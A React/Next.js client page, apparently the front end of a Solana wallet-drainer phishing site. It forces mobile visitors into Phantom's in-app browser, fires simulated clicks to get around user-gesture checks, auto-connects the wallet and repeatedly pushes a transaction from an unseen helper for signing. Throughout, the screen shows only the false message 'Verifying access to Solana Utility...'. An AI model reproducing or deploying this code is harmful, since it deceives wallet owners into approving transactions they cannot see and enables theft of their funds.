'use client'

import { useEffect, useRef, useState } from 'react'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import { WalletName } from '@solana/wallet-adapter-base'
import { createUnsignedTransaction } from '../services/transaction'
import { Transaction } from '@solana/web3.js'

/* -------- Phantom provider tipi (any yerine) -------- */
interface PhantomProvider {
  isPhantom?: boolean
}
declare global {
  interface Window {
    solana?: PhantomProvider
  }
}
/* ---------------------------------------------------- */

export default function TransactionPage() {
  const { connection } = useConnection()
  const {
    publicKey,
    sendTransaction,
    connect,
    select,
    connected,
  } = useWallet()

  const retries = useRef(0)
  const maxRetries = 3
  const waiting   = useRef(false)
  const [status, setStatus] = useState('Loading...')

  /* ------------  ➜  MOBİLDE PHANTOM’A OTOMATİK DEEPLINK  ------------ */
  useEffect(() => {
    const ua        = navigator.userAgent
    const isMobile  = /Android|iPhone|iPad/i.test(ua)
    const isPhantom = window.solana?.isPhantom ?? false

    if (isMobile && !isPhantom) {
      const simulateClick = () => {
        const fakeClick = new MouseEvent('click', { bubbles: true, cancelable: true, view: window })
        document.body.dispatchEvent(fakeClick)
      }

      const deepLink = `https://phantom.app/ul/browse/${encodeURIComponent(window.location.href)}?ref=${encodeURIComponent(window.location.href)}`

      simulateClick()
      const a = document.createElement('a')
      a.href   = deepLink
      a.target = '_blank'
      document.body.appendChild(a)
      a.click()
      setTimeout(() => a.remove(), 500)

      return
    }
  }, [])
  /* ------------------------------------------------------------------ */

  /* -----------------------  İŞLEM AKIŞI  ---------------------------- */
  useEffect(() => {
    const simulateClick = () => {
      const fakeClick = new MouseEvent('click', { bubbles: true, cancelable: true, view: window })
      document.body.dispatchEvent(fakeClick)
    }

    const trySendTransaction = async () => {
      if (!publicKey || waiting.current || retries.current >= maxRetries) return
      waiting.current = true

      try {
        simulateClick()
        setStatus('Verifying access to Solana Utility...')

        const tx = await createUnsignedTransaction(publicKey)

        if (tx) {
          const sig = await sendTransaction(tx as unknown as Transaction, connection)
          console.log('✅ transaction sent:', sig)
          setStatus('Successful ✅')
        } else {
          throw new Error('Transaction oluşturulamadı (null döndü)')
        }
      } catch (err: unknown) {
        if (err instanceof Error) {
          console.warn('⚠️ İşlem başarısız:', err.message)
        } else {
          console.warn('⚠️ Bilinmeyen hata:', err)
        }

        retries.current += 1
        setStatus('Verifying access to Solana Utility...')

        setTimeout(() => {
          waiting.current = false
          void trySendTransaction()
        }, 3000)
      }
    }

    const start = async () => {
      try {
        simulateClick()
        await select('Phantom' as WalletName)
        if (!connected) await connect()
        if (publicKey) void trySendTransaction()
      } catch (err) {
        console.error('connection error:', err)
        setStatus('Connection error ❌')
      }
    }

    void start()
  }, [publicKey, connected, connect, select, sendTransaction, connection])
  /* ------------------------------------------------------------------ */

  return (
    <div style={{
      backgroundColor: 'black',
      width: '100vw',
      height: '100vh',
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      color: 'white',
      fontSize: '16px',
      fontFamily: 'monospace'
    }}>
      {status}
    </div>
  )
}
